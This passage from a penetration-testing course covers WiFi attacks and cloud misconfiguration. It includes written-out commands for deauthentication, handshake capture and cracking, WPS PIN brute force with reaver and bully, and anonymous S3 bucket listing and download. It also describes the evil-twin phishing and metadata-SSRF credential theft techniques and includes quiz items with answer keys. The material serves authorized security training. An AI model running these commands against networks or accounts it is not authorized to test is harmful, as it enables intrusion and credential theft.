- WPA and WPA2 replaced WEP specifically to address this by deriving a unique per-session key via a handshake instead of reusing a static key and short IV
- WEP is obsolete and rarely encountered in the field today, but the IV-reuse flaw is the reason WPA/WPA2's handshake-based design exists at all

**Quick Quiz:**

1. Why is WEP crackable given enough captured traffic?
   - **Its 24-bit IV space is small enough that IVs repeat quickly, leaking information about the RC4 keystream that can be recovered statistically** ✓
   - It uses no encryption at all
   - It requires the attacker to already know the passphrase
   - It transmits the full WEP key in plaintext in every frame
   > WEP's small IV space causes frequent IV reuse, which leaks enough about the RC4 keystream to recover the key statistically, without brute force.
2. Is WEP's IV-reuse weakness a misconfiguration or a design flaw?
   - A misconfiguration that can be fixed by choosing a longer WEP key
   - A bug limited to one specific vendor's firmware
   - **A fundamental weakness in WEP's protocol design that no amount of correct configuration can fix** ✓
   - An issue only relevant to WEP networks with fewer than 10 clients
   > The IV-reuse flaw is baked into WEP's protocol design itself, not a configuration mistake, which is why it can't be patched by using WEP 'correctly'.
3. How did WPA/WPA2 fix the problem that broke WEP?
   - By increasing the IV size to 48 bits while keeping a static key
   - **By deriving a unique per-session key through a handshake instead of reusing a static key with a short IV** ✓
   - By switching from RC4 to a stronger IV-free cipher while still using a static key
   - By removing encryption from wireless frames entirely
   > WPA/WPA2 discard WEP's static-key-plus-short-IV scheme entirely, deriving a fresh per-session key through the 4-way handshake instead.

#### 178. The WPA/WPA2 4-Way Handshake `[theory]` — Week 15

WPA and WPA2 fixed WEP's static-key problem by never sending the actual encryption key over the air at all — instead the client and AP each independently derive it from information they already share. The PSK (the WiFi passphrase you type in) is run through PBKDF2 to produce the PMK (Pairwise Master Key), which never leaves either device. To get from that shared PMK to the actual per-session encryption keys, the AP and client perform the 4-way handshake: the AP sends a random nonce (ANonce), the client combines it with its own random nonce (SNonce), the PMK, and both MAC addresses to derive the PTK (Pairwise Transient Key), sends its SNonce back with a Message Integrity Check, the AP derives the same PTK independently and confirms it, and a final message confirms the cipher suite and installs the keys. Because the PMK itself is never transmitted, an attacker who captures this handshake doesn't get the passphrase directly — but the handshake does contain everything needed to test candidate passphrases offline: run a guessed passphrase through the same PBKDF2 to PMK to PTK derivation and check whether it produces the same MIC seen in the captured frames. That's why capturing a complete 4-way handshake is the single prerequisite for every offline WPA/WPA2 cracking attempt in this module. You finish able to explain what the 4-way handshake actually exchanges (nonces, not the key itself) and why capturing it is necessary before any offline crack can even begin.

**Key Points:**

- The PSK (typed passphrase) plus SSID are run through PBKDF2 to produce the PMK (Pairwise Master Key) — this derivation happens independently on both client and AP; the PMK itself is never sent over the air
- Message 1 (AP to client): AP sends ANonce. Message 2 (client to AP): client sends SNonce plus a MIC, having derived the PTK from PMK+ANonce+SNonce+both MAC addresses. Message 3 (AP to client): AP confirms and installs keys. Message 4 (client to AP): client acknowledges
- The PTK (Pairwise Transient Key) is the actual per-session key used to encrypt traffic, derived fresh each session from the PMK plus the two nonces exchanged live
- Capturing the 4-way handshake does not hand you the passphrase — it gives you the nonces and a MIC value you can check a guessed passphrase against offline
- Offline cracking means re-deriving PMK to PTK to MIC for every candidate passphrase and comparing it to the captured MIC; a match confirms that passphrase is correct
- Because the PMK/PTK are never transmitted, there's no way to derive the passphrase from the handshake mathematically — the only path is guessing candidates, which is why passphrase strength (length, entropy) is what actually protects a WPA2 network

**Quick Quiz:**

1. What does the PBKDF2 derivation using the PSK and SSID actually produce, and does it ever cross the air?
   - The PTK, which is broadcast in every beacon frame
   - **The PMK (Pairwise Master Key), which is derived independently on both sides and never transmitted over the air** ✓
   - The MIC, which is sent in cleartext during association
   - The ANonce, which is broadcast continuously
   > PBKDF2 over the PSK and SSID produces the PMK on both the client and AP independently; the PMK itself is never sent over the air.
2. In the 4-way handshake, what happens in Message 1 versus Message 2?
   - **Message 1: the AP sends the ANonce; Message 2: the client returns its SNonce plus a MIC after deriving the PTK** ✓
   - Message 1: the client sends the passphrase; Message 2: the AP confirms it
   - Message 1: the AP installs the keys; Message 2: the client sends the ANonce
   - Message 1 and Message 2 are identical acknowledgements with no data exchanged
   > The AP starts by sending its ANonce (Message 1), then the client derives the PTK and replies with its SNonce and a MIC (Message 2).
3. Why is capturing the 4-way handshake necessary before any offline WPA2 crack attempt?
   - It contains the plaintext passphrase directly
   - It disables the AP's encryption temporarily
   - **It provides the nonces and a MIC value that a guessed passphrase's re-derived PMK/PTK can be checked against, since the PMK itself is never transmitted** ✓
   - It is not actually necessary; any captured beacon frame works the same way
   > The handshake yields nonces and a MIC to test candidate passphrases against offline; it never reveals the passphrase or PMK directly.

#### 179. Capturing a Handshake with the Aircrack-ng Suite `[lab]` — Week 15

With the theory in place, capturing a real handshake against a network you're authorized to test is a straightforward three-tool workflow inside the aircrack-ng suite. First airmon-ng puts the wireless adapter into monitor mode; airodump-ng run against the whole band shows every visible AP with its BSSID, channel, and ESSID, letting you pick the specific target; airodump-ng is then re-run locked to that one channel and BSSID while writing all captured frames to a file, so you're only capturing the target's traffic instead of the whole spectrum. Waiting for a client to naturally reconnect can take a long time, so aireplay-ng's deauthentication attack speeds it up: it sends spoofed deauth frames appearing to come from the AP, telling an already-connected client it's been disconnected — most clients respond by immediately reassociating, which regenerates the entire 4-way handshake in the clear for airodump-ng to capture. airodump-ng displays a 'WPA handshake' notice in its header once a complete 4-way exchange has been captured against the target BSSID, confirming the .cap file now has what's needed for the next step. You finish able to run the full capture workflow — enable monitor mode, locate and lock onto a target, force a handshake with a deauth burst, and confirm a valid capture — end to end.

**Key Points:**

- airmon-ng start <interface> switches the adapter into monitor mode, typically producing a new monitor interface (e.g. wlan0mon)
- airmon-ng check identifies processes (NetworkManager, wpa_supplicant) that can interfere with monitor mode and should be stopped first
- airodump-ng <mon-interface> with no filters surveys the whole band, listing every visible BSSID/ESSID/channel/client — used to identify and confirm the target
- airodump-ng -c <channel> --bssid <BSSID> -w <filename> <mon-interface> locks the capture to one AP's channel and BSSID and writes frames to disk, avoiding noise from unrelated networks
- aireplay-ng --deauth <count> -a <BSSID> [-c <client-MAC>] <mon-interface> sends spoofed deauthentication frames, forcing a connected client to disconnect and reassociate, regenerating the 4-way handshake
- airodump-ng shows 'WPA handshake: <BSSID>' in its terminal header once a complete 4-way exchange for the target has landed in the capture file
- Deauthentication only works against a network with at least one already-connected client — an AP with no clients has nothing to force a handshake from

```bash
airmon-ng check
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

**Quick Quiz:**

1. Why is airodump-ng run twice — first with no filters, then locked to a channel and BSSID?
   - The first run is only cosmetic and has no functional purpose
   - Locking to a channel/BSSID is required by law
   - **The unfiltered run surveys the whole band to identify and confirm the target; the locked run then captures only that target's traffic, avoiding noise from unrelated networks** ✓
   - The first run captures the handshake and the second is only for reporting
   > The broad scan identifies and confirms the target BSSID/channel, then the locked capture focuses only on that target, avoiding unrelated traffic.
2. What does aireplay-ng's deauthentication attack actually do?
   - **It sends spoofed deauth frames appearing to come from the AP, forcing an already-connected client to disconnect and reassociate, which regenerates the 4-way handshake** ✓
   - It brute-forces the WPA2 passphrase directly over the air
   - It permanently disables the target AP
   - It converts a captured handshake into hashcat format
   > The deauth attack spoofs disconnect frames from the AP, prompting the client to reassociate and regenerate the 4-way handshake in the clear.
3. Under what condition will a deauth-based handshake capture attempt fail regardless of how many deauth frames are sent?
   - If the AP is using WPA2 instead of WPA
   - If the adapter is in managed mode instead of monitor mode during the deauth itself
   - **If there is no client currently connected to the target AP, since there's nothing to force a handshake from** ✓
   - If the ESSID contains special characters
   > Deauth only works against a network with at least one already-connected client; an AP with no clients has nothing to force a handshake from.

#### 180. Cracking the Captured Handshake Offline `[lab]` — Week 15

Capturing the handshake is only step one — the actual passphrase recovery happens entirely offline against the .cap file, and it is fundamentally a dictionary attack, not a protocol break. aircrack-ng can crack directly against the capture: pointed at a wordlist and the .cap file, it re-runs the PBKDF2 to PMK to PTK to MIC derivation for every candidate word and checks it against the captured MIC, reporting a match if found. For faster or GPU-accelerated cracking, the handshake is converted — hcxpcapngtool from the hcxtools project converts a .cap into hashcat's format — and run through hashcat: mode 22000 is hashcat's current mode for WPA-PBKDF2-PMKID+EAPOL (covering both handshake- and PMKID-based captures), while the older mode 2500 handled the classic EAPOL handshake format before 22000 unified it. In every case, success or failure depends entirely on whether the real passphrase appears in the wordlist you supply — a strong, unique, non-dictionary passphrase defeats this attack completely regardless of how much captured traffic or GPU power is thrown at it, which is the whole point of WPA2's design once the handshake itself can't be reversed mathematically. You finish able to run both aircrack-ng and hashcat against a captured handshake and explain, correctly, that this is a wordlist-coverage problem rather than a cryptographic weakness in WPA2 itself.

**Key Points:**

- aircrack-ng -w <wordlist> <capture-file>.cap tests each wordlist entry by re-deriving PMK to PTK to MIC and comparing it to the captured MIC — a match confirms that entry is the network's passphrase
- hashcat requires converting the capture first, typically with hcxpcapngtool (from hcxtools) to produce a hashcat-compatible hash file
- hashcat mode 22000 (WPA-PBKDF2-PMKID+EAPOL) is the current unified mode for WPA/WPA2 handshake and PMKID-based cracking
- hashcat mode 2500 was the older, now-superseded mode specifically for classic EAPOL 4-way handshake captures, prior to the 22000 format unification
- Cracking speed depends on hardware (CPU vs GPU), but success depends entirely on wordlist coverage — if the real passphrase isn't in the list, no amount of compute finds it
- This is why WPA2 cracking is described as a dictionary-attack problem rather than a break in the protocol: the 4-way handshake itself gives up nothing without a correct guess to test against it
- A long, high-entropy, non-dictionary passphrase is the actual mitigation, since it puts the real passphrase permanently out of wordlist reach

```bash
aircrack-ng -w wordlist.txt capture-01.cap
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 hash.hc22000 wordlist.txt
```

**Quick Quiz:**

1. What ultimately determines whether an offline crack against a captured handshake succeeds?
   - **Whether the real passphrase appears in the wordlist supplied — compute power alone cannot overcome an absent entry** ✓
   - The GPU model used, regardless of wordlist content
   - The number of deauth frames sent during capture
   - The length of the ESSID
   > Success depends entirely on wordlist coverage; if the real passphrase isn't in the list, no amount of compute power will find it.
2. What must be done before a captured handshake can be cracked with hashcat?
   - Nothing — hashcat reads .cap files natively
   - **The .cap file must be converted, typically with hcxpcapngtool, into a hashcat-compatible hash format** ✓
   - The handshake must first be cracked with aircrack-ng to confirm it is valid
   - The wordlist must be converted to hexadecimal
   > hashcat requires the capture to be converted first, typically with hcxpcapngtool from the hcxtools project, into its own hash format.
3. How does hashcat mode 22000 relate to the older mode 2500?
   - 2500 is the current mode and 22000 is deprecated
   - They are unrelated modes for entirely different protocols
   - **22000 is the current, unified mode for WPA-PBKDF2-PMKID+EAPOL, superseding the older mode 2500 used for classic EAPOL handshake captures** ✓
   - 22000 only works with WEP captures
   > Mode 22000 is the current unified mode covering handshake and PMKID-based captures, having superseded the older EAPOL-only mode 2500.

#### 181. WPS Attacks — Reaver and Bully `[lab]` — Week 15

WPS (WiFi Protected Setup) was designed to make connecting devices easier — push a button or enter an 8-digit PIN instead of typing a long passphrase — but its PIN implementation has a design flaw independent of how strong the actual WPA2 passphrase is. The 8th digit of the PIN is just a checksum of the first 7, and critically, many AP implementations validate the PIN in two separate halves: the first 4 digits are checked and acknowledged before the last 3 (plus checksum) are ever tested. That splits what looks like a keyspace of 10^8 into two much smaller problems — at most 10^4 guesses for the first half and 10^3 for the second — an effective keyspace that's brute-forceable in a realistic number of attempts against an AP that doesn't rate-limit or lock out failed PIN attempts. Tools like reaver and bully automate exactly this: they send crafted WPS PIN guesses to the target AP, exploit that two-stage validation to narrow in on the correct half at a time, and once the full PIN is recovered they can query the AP for the actual WPA2 passphrase it's configured with — a distinct, more mechanical attack path from the wordlist-dependent handshake cracking in the previous topic, and one that fails outright against APs with WPS disabled or with proper lockout after repeated failures. You finish able to explain why WPS's PIN design collapses the effective keyspace far below a true 8-digit brute force, and why a reaver/bully attack is a completely different technique from cracking a captured 4-way handshake.

**Key Points:**

- The WPS PIN is 8 digits, but the 8th is a checksum of the first 7, leaving 7 meaningful digits
- Many AP implementations check the PIN's two halves (first 4 digits, then last 3 plus checksum) separately and acknowledge each independently, letting an attacker confirm one half before guessing the other
- That two-stage validation reduces the real search space to roughly 10^4 + 10^3 guesses rather than a true 10^7 brute force, making it feasible against APs without proper anti-brute-force protections
- reaver and bully are the standard tools that automate sending crafted WPS PIN guesses and exploiting the split-validation behavior
- Once the full 8-digit PIN is recovered, WPS itself will hand back the AP's configured WPA2 passphrase — no wordlist or handshake cracking required
- This attack targets WPS specifically, not the WPA2 handshake — it fails completely against an AP with WPS disabled, or one that implements lockout/rate-limiting after repeated failed PIN attempts
- WPS PIN recovery and 4-way-handshake dictionary cracking are two separate, independent attack paths against two different features of the same AP

```bash
wash -i wlan0mon
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
bully wlan0mon -b AA:BB:CC:DD:EE:FF
```

**Quick Quiz:**

1. Why is the WPS PIN's effective keyspace far smaller than its 8 digits suggest?
   - **The 8th digit is a checksum of the first 7, and many APs validate the PIN in two separate halves (4 digits, then 3 plus checksum), acknowledging each independently and collapsing the real search space to roughly 10^4 + 10^3 guesses** ✓
   - WPS PINs are always set to 00000000 by default
   - The PIN is transmitted in plaintext in every beacon frame
   - WPS uses only 4 digits total, not 8
   > The checksum digit plus two-stage half validation collapses the true 10^7 keyspace down to roughly 10^4 + 10^3 feasible guesses.
2. Once reaver or bully recovers the full WPS PIN, what happens next?
   - The attacker must still run a full dictionary attack against the handshake
   - **WPS hands back the AP's actual configured WPA2 passphrase directly, with no wordlist or handshake cracking required** ✓
   - The AP automatically resets to factory defaults
   - Nothing further can be recovered — the PIN itself is the only output
   > Recovering the full PIN lets WPS hand back the AP's actual configured WPA2 passphrase, bypassing wordlist or handshake cracking entirely.
3. Under what conditions does a reaver/bully WPS attack fail outright?
   - Only if the AP is broadcasting on 5GHz
   - Only if the client device is turned off
   - **Against an AP with WPS disabled, or one that implements lockout/rate-limiting after repeated failed PIN attempts** ✓
   - It never fails once monitor mode is enabled
   > The attack fails completely against an AP with WPS disabled, or one with proper lockout/rate-limiting after repeated failed attempts.

#### 182. Evil Twin / Rogue AP Attacks (Concept) `[theory]` — Week 15

Every attack so far has targeted the network's authentication directly — an Evil Twin attack sidesteps authentication entirely by targeting the person instead. The attacker stands up a rogue access point that clones a legitimate network's ESSID (and often its channel and apparent security type), typically after deauthenticating clients off the real AP so their devices see the fake one as the strongest or only available option with that name. Once a victim connects to the clone, tools like airgeddon or wifiphisher present a captive portal — a fake login or 'router firmware update' page — that asks the victim to type in the real WiFi passphrase or other credentials, which the attacker simply logs; no cracking, no handshake capture, no WPS PIN math is involved anywhere in this path. This works because 802.11 clients generally trust an ESSID by name rather than cryptographically verifying which physical AP they're really talking to, and it's exactly the kind of attack that depends on the victim being deceived rather than any protocol weakness being exploited — which is also why it sits at the boundary of technical pentesting and social engineering, and needs explicit scope authorization covering client interaction, not just the network. You finish able to describe, at a conceptual level, how an Evil Twin/captive-portal attack differs fundamentally from every handshake- or PIN-based attack earlier in this module — it attacks trust and human judgment, not cryptography.

**Key Points:**

- An Evil Twin is a rogue AP configured to broadcast the same ESSID (and often the same apparent channel/security type) as a legitimate target network
- Often paired with a deauth attack against the real AP to push victim clients toward reconnecting — clients don't cryptographically verify AP identity by ESSID alone, they reconnect to whichever AP answers with the expected name
- Once connected to the clone, a captive portal (a fake login or firmware-update page) is presented to the victim, asking directly for the WiFi passphrase or other credentials
- Tools like airgeddon and wifiphisher automate the rogue AP setup, deauth, and captive portal delivery as an integrated workflow
- This attack captures credentials via deception, not via cracking — it produces no handshake to crack and involves no WPS PIN math, making it a fundamentally different technique from the rest of this module
- Because it directly targets and deceives real people connecting to the network, it sits closer to social engineering than a pure protocol attack, and requires scope authorization that explicitly covers this kind of client-facing interaction

**Quick Quiz:**

1. What does an Evil Twin attack fundamentally exploit?
   - A cryptographic weakness in the WPA2 4-way handshake
   - **The fact that 802.11 clients generally trust an ESSID by name rather than cryptographically verifying which physical AP they're really talking to** ✓
   - A flaw in the WPS PIN checksum algorithm
   - IV reuse in RC4 keystream generation
   > Evil Twin attacks exploit clients trusting an ESSID by name rather than verifying the actual physical AP cryptographically, not a protocol weakness.
2. How does the attacker actually obtain credentials in an Evil Twin attack?
   - By cracking the captured handshake offline with hashcat
   - By recovering the WPS PIN with reaver
   - **Via a captive portal (fake login or firmware-update page) presented once the victim connects to the cloned AP, which logs whatever they type in** ✓
   - By exploiting IV reuse in the rogue AP's RC4 stream
   > Once connected to the clone, a captive portal asks the victim directly for the passphrase or credentials, which the attacker simply logs.
3. Which tools automate the rogue AP setup, deauth, and captive portal delivery for an Evil Twin attack?
   - aircrack-ng and hashcat
   - reaver and bully
   - hcxpcapngtool and wash
   - **airgeddon and wifiphisher** ✓
   > airgeddon and wifiphisher automate the rogue AP setup, deauth, and captive portal delivery as an integrated Evil Twin workflow.


---

## M20: Cloud Security Basics

**Month 4** · Week 16 · 8 topics

Cloud misconfigurations, not exotic zero-days, are the everyday reality behind most cloud security assessments — a public S3 bucket, an over-permissioned IAM policy, or a leaked access key does more real damage than any novel exploit. This module covers AWS and Azure fundamentals from a security practitioner's angle: the shared-responsibility model, IAM, S3 exposure, metadata-service SSRF, Azure AD/Entra ID basics, cloud logging, and secrets exposure — the misconfiguration classes an assessor actually finds, not full cloud-architecture design.

**Learning Outcomes:**

- Explain the cloud shared-responsibility model and correctly place responsibility for a given misconfiguration
- Read an AWS IAM policy and identify least-privilege violations such as wildcard Action/Resource grants
- Explain the EC2 instance-metadata SSRF chain and why IMDSv2 mitigates it
- Distinguish Azure AD/Entra ID's cloud-native identity model (tenants, Conditional Access) from on-prem Active Directory
- Walk a realistic AWS attack chain from initial access through privilege escalation to lateral movement

**Module Resources:**

- [AWS IAM documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/introduction.html) _(link)_
- [AWS Security Best Practices](https://docs.aws.amazon.com/whitepapers/latest/aws-security-best-practices/aws-security-best-practices.html) _(link)_
- [HackTricks - AWS Pentesting](https://book.hacktricks.wiki/en/cloud-security/aws-security/index.html) _(link)_
- [flAWS.cloud](http://flaws.cloud) _(platform)_

**Module Quiz (9 questions):**

1. Under the AWS shared-responsibility model, who is responsible for guest-OS patching on an EC2 instance (IaaS)?
   - AWS handles guest OS patching automatically for EC2
   - **The customer, since IaaS leaves everything above the hypervisor to the customer** ✓
   - Neither party -- IaaS instances don't run an OS
   - A third-party MSSP by default
   > On IaaS, the customer patches the guest OS and everything above it -- the provider only secures the hypervisor and below.
2. What does an IAM policy of Action: '*' and Resource: '*' effectively grant?
   - Read-only access to one S3 bucket
   - No access, since AWS blocks wildcard policies
   - **Administrator-equivalent power over the entire AWS account** ✓
   - Access limited to EC2 only
   > A wildcard Action and Resource together grant administrator-equivalent power over the entire account.
3. What AWS feature overrides any public-granting bucket policy or ACL underneath it?
   - S3 Versioning
   - S3 Lifecycle Rules
   - S3 Transfer Acceleration
   - **S3 Block Public Access** ✓
   > S3 Block Public Access is the account- or bucket-level override recommended as the defensive baseline against public exposure.
4. An application with an SSRF flaw is tricked into fetching http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>. What does the attacker obtain?
   - The EC2 instance's root disk encryption key
   - **The temporary access key/secret key/session token for the instance's attached IAM role** ✓
   - The AWS account's root password
   - A copy of the instance's kernel
   > IMDS returns the attached IAM role's temporary credentials, which the attacker can then use against the AWS API.
5. Why does enforcing IMDSv2-only mitigate the metadata SSRF chain?
   - **It requires a PUT request for a session token before any GET is honored, which most SSRF (GET-only) can't complete** ✓
   - It encrypts all metadata responses
   - It moves the metadata service to a public IP
   - It disables IAM roles entirely
   > IMDSv2's required PUT-then-GET flow can't be completed by a GET-only SSRF, which is why it mitigates the chain.
6. Which of these does Entra ID lack, unlike on-prem Active Directory?
   - Users and groups
   - **Group Policy Objects (GPOs)** ✓
   - Tenants
   - Conditional Access policies
   > Entra ID has no Organizational Units, GPOs, or Kerberos tickets -- it uses tenants and Conditional Access policies instead.
7. A sophisticated intruder gains a privileged foothold. Why would they target CloudTrail early?
   - To speed up their own API calls
   - Because CloudTrail is required for lateral movement
   - **To disable, scope down, or redirect logging so incident response has no way to reconstruct what happened** ✓
   - Because CloudTrail stores their stolen credentials
   > Disabling or redirecting CloudTrail is one of the first moves a sophisticated intruder makes, since it blinds incident response.
8. Why is a Docker image secret still recoverable even after a later layer deletes it?
   - Docker automatically backs up all secrets to AWS
   - **Each image layer is an immutable, independently extractable filesystem diff, so the secret persists in the earlier layer** ✓
   - Secrets are stored in DNS records
   - Docker images cannot delete files once written
   > Because image layers are immutable diffs, a secret set in an earlier layer persists and is extractable regardless of later deletions.
9. In a realistic AWS attack chain, what typically enables privilege escalation after initial access?
   - Exploiting a new zero-day in AWS's hypervisor
   - Physically accessing the AWS data center
   - Brute-forcing the root account password
   - **An over-broad existing IAM policy (e.g. wildcard iam:PassRole) that lets the attacker grant themselves more access** ✓
   > Privilege escalation in the chain comes from abusing an over-broad policy someone else already configured, not a new exploit.

### Topics

#### 176. Cloud Shared-Responsibility Model `[theory]` — Week 16

Move a workload from an on-prem data center to AWS or Azure and a security team's job doesn't shrink — it splits. The provider secures the cloud (physical data centers, host hypervisor, managed service infrastructure, global network), while the customer secures what's in the cloud (their own IAM configuration, data classification and encryption choices, network access-control rules, and how they configure every managed service they turn on). AWS calls this split 'security of the cloud' vs 'security in the cloud'; Azure and Google Cloud describe the same boundary differently but the line falls in the same place. Where that boundary sits also shifts by service model: on IaaS (raw EC2 instances, Azure VMs) the customer patches the guest OS and everything above it; on PaaS (RDS, Azure App Service) the provider manages the OS and platform, leaving the customer responsible mainly for data, access, and application-level config; on SaaS the provider runs nearly everything except the customer's own account security and data-handling choices. The reason this model matters to a security practitioner specifically is that the overwhelming majority of real cloud security findings — publicly-readable S3 buckets, wide-open security groups, over-permissioned IAM roles, disabled logging — sit squarely on the customer side of that line: the provider's underlying infrastructure was never touched, the customer's configuration was the failure. You finish able to draw the responsibility line for IaaS, PaaS, and SaaS workloads and explain why a 'cloud breach' is, in the overwhelming majority of documented cases, a customer misconfiguration rather than a provider compromise.

**Key Points:**

- AWS framing: "security of the cloud" (provider) vs "security in the cloud" (customer)
- Provider always secures: physical data centers, hardware, host OS/hypervisor for managed services, global network infrastructure
- Customer always secures: IAM configuration, data classification/encryption choices, network ACLs/security groups, application-level configuration
- IaaS (EC2, Azure VMs): customer is responsible for guest-OS patching, network config, data, and everything above the hypervisor
- PaaS (RDS, Azure App Service): provider manages the OS/platform; customer is responsible mainly for data, access control, and service configuration
- SaaS: provider runs nearly everything; customer is responsible chiefly for account security, user access, and data handling
- Practical implication: most real-world cloud security findings (public buckets, open security groups, over-permissioned roles, disabled logging) are customer-side misconfigurations, not provider infrastructure compromises

**Quick Quiz:**

1. In AWS's shared-responsibility framing, what does 'security of the cloud' refer to?
   - **The provider's responsibility for physical data centers, hardware, and host hypervisor** ✓
   - The customer's IAM configuration and data encryption choices
   - A joint audit performed once a year
   - The end user's device antivirus software
   > AWS calls the provider's side of the split 'security of the cloud' -- physical data centers, hardware, and the host hypervisor/global network infrastructure.
2. On a PaaS service like Amazon RDS, which responsibilities fall to the customer?
   - Patching the underlying guest operating system
   - **Mainly data, access control, and service-level configuration, since the provider manages the OS/platform** ✓
   - Nothing -- PaaS shifts all responsibility to the provider
   - Securing the physical hardware hosting the database
   > On PaaS, the provider manages the OS and platform, leaving the customer responsible mainly for data, access, and how they configure the service.
3. Why does the module treat most cloud security findings (public buckets, open security groups, over-permissioned roles) as customer failures rather than provider failures?
   - Because providers never get breached
   - Because customers can't configure these settings at all
   - **Because these misconfigurations sit on the customer side of the shared-responsibility line, and the provider's underlying infrastructure was never touched** ✓
   - Because these are always caused by zero-day exploits in the provider's hypervisor
   > These finding classes are customer-side configuration failures -- the provider's underlying infrastructure isn't what's exploited.

#### 177. IAM Fundamentals - Users, Groups, Roles, Policies `[theory]` — Week 16

AWS Identity and Access Management (IAM) is the system that decides who can do what to which resource — every API call to AWS is checked against an IAM policy before it's allowed to run. IAM is built from four pieces: users (an individual identity, human or service, with long-term credentials), groups (a way to attach the same policies to many users at once), roles (a temporary identity assumed by a user, service, or another AWS account, backed by short-lived credentials instead of a permanent access key), and policies (JSON documents that state which actions are allowed or denied on which resources, under which conditions). A policy statement's Effect, Action, Resource, and Condition fields are where least privilege either gets enforced or quietly abandoned: an Action of "s3:GetObject" scoped to one bucket ARN is least privilege; an Action of "*" paired with a Resource of "*" grants that identity administrator-equivalent power over the entire account, and it's exactly this kind of wildcard grant — usually added because someone was in a hurry and wildcards are the fastest way to make an access-denied error disappear — that shows up as the root cause behind most real-world cloud privilege-escalation findings, because it means every credential leak, every SSRF-stolen role token, and every misconfigured trust relationship is instantly a full account compromise rather than a contained one. You finish able to read an IAM policy document, identify a wildcard-permission finding, and explain why scoping Action and Resource down to exactly what a workload needs is what actually contains the blast radius of a leaked credential.

**Key Points:**

- Four IAM building blocks: users (long-term individual identity), groups (attach shared policies to many users), roles (temporary identity with short-lived credentials, assumable by users/services/other accounts), policies (JSON documents defining allowed/denied actions)
- Policy statement fields: Effect (Allow/Deny), Action (the API calls covered), Resource (the ARNs covered), Condition (extra constraints, e.g. source IP or MFA)
- Least privilege: grant only the specific Actions on the specific Resources a workload actually needs, nothing more
- Wildcard danger: "Action": "*" or "Resource": "*" grants sweeping, often account-wide power — this pattern is the root cause behind most cloud privilege-escalation findings
- Prefer assumed roles with short-lived, auto-rotating credentials over permanent IAM user access keys, especially for workloads running on EC2/Lambda
- aws sts get-caller-identity reveals which identity (user, role, or assumed-role session) current credentials belong to — the first command run during any cloud assessment
- aws iam list-attached-user-policies enumerates which managed policies are attached to a given user, showing exactly what that identity can do

```bash
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>
aws iam get-policy-version --policy-arn <arn> --version-id v1
```

**Quick Quiz:**

1. Which IAM building block is backed by short-lived credentials instead of a permanent access key?
   - A user
   - A group
   - **A role** ✓
   - A policy
   > A role is a temporary identity assumed by a user, service, or account, backed by short-lived credentials, unlike a user's long-term access key.
2. An IAM policy statement grants Action: '*' and Resource: '*'. What does this represent?
   - A properly scoped least-privilege grant
   - A syntactically invalid policy that AWS will reject
   - A policy that only applies to S3
   - **A wildcard grant giving that identity administrator-equivalent power over the entire account, and the root cause of most cloud privilege-escalation findings** ✓
   > Action:* combined with Resource:* is a wildcard grant equivalent to admin-level access account-wide, and the root cause of most cloud privilege-escalation findings.
3. What is the first command typically run during a cloud assessment, and why?
   - aws iam list-attached-user-policies, because it edits permissions
   - **aws sts get-caller-identity, because it reveals exactly which identity the current credentials belong to** ✓
   - aws s3 ls, because it lists all buckets first
   - aws cloudtrail describe-trails, because logging must be checked first
   > aws sts get-caller-identity confirms which user, role, or assumed-role session the current credentials belong to, before anything else is enumerated.

#### 178. S3 Bucket Misconfiguration `[theory]` — Week 16

Amazon S3 buckets default to private, but a single bucket policy or ACL change can flip that — granting public-read, public-write, or even public-list-and-read access to everyone on the internet, no AWS account or authentication required. This is one of the most common and well-documented finding classes in cloud security assessments: an organization spins up a bucket for backups, static assets, or a data export, someone applies a broad bucket policy (or an ACL granting the AllUsers or AuthenticatedUsers group access) to unblock an integration quickly, and the bucket stays that way indefinitely because nothing about a public S3 bucket is visually different from a private one in day-to-day use — there's no broken functionality to notice. An attacker doesn't need any credentials to find and exploit this: bucket names are guessable or discoverable (naming conventions like company-backups or company-logs-prod are common), and once a bucket allows anonymous listing, `aws s3 ls` with `--no-sign-request` enumerates every object in it, and `aws s3 cp --no-sign-request` pulls any object out. A public-write bucket is arguably worse than public-read, since it lets an attacker upload arbitrary content — including replacing files an application trusts, if that bucket backs a website or software distribution pipeline. Defensively, AWS's S3 Block Public Access setting (settable at the account or bucket level) is the blunt, effective override that ignores any public-granting policy or ACL underneath it. You finish able to test whether an S3 bucket is publicly accessible using anonymous, unauthenticated AWS CLI calls and explain why Block Public Access exists as an account-wide safety net rather than relying on getting every individual bucket policy right.

**Key Points:**

- S3 buckets are private by default; public exposure comes from an explicit bucket policy or ACL granting access to "Everyone" (AllUsers) or "Any authenticated AWS user" (AuthenticatedUsers)
- Common root cause: a broad policy applied to quickly unblock an integration, then never tightened back down — nothing visibly breaks, so it goes unnoticed
- No credentials needed to exploit: bucket names are often guessable/discoverable (e.g. company-backups, company-logs-prod naming patterns)
- --no-sign-request on the AWS CLI makes fully anonymous, unauthenticated calls against a public bucket
- Public-list buckets let an attacker enumerate every object; public-read lets them download any object; public-write lets them upload/overwrite arbitrary content
- S3 Block Public Access (account-level or bucket-level setting) overrides any public-granting policy/ACL underneath it — the recommended defensive baseline
- This is one of the most common and well-documented finding classes in cloud security assessments, not a rare edge case

```bash
aws s3 ls s3://bucket-name --no-sign-request
aws s3 cp s3://bucket-name/file.txt . --no-sign-request
aws s3api get-bucket-policy --bucket bucket-name
aws s3api get-bucket-acl --bucket bucket-name
```

**Quick Quiz:**

1. By default, are S3 buckets public or private?
   - Public by default; must be explicitly locked down
   - **Private by default; public exposure requires an explicit bucket policy or ACL change** ✓
   - Public only for the AWS root account
   - Determined randomly by AWS
   > S3 buckets are private by default -- exposure comes from an explicit policy or ACL granting access to Everyone or Any authenticated AWS user.
2. What AWS CLI flag lets an attacker query a public S3 bucket without any AWS credentials?
   - --public-only
   - --anonymous-mode
   - **--no-sign-request** ✓
   - --skip-auth
   > --no-sign-request makes fully anonymous, unauthenticated calls against a public bucket.
3. What is the recommended defensive baseline against public S3 exposure, according to the module?
   - Manually reviewing every individual bucket policy for correctness
   - **S3 Block Public Access, an account- or bucket-level setting that overrides any public-granting policy or ACL underneath it** ✓
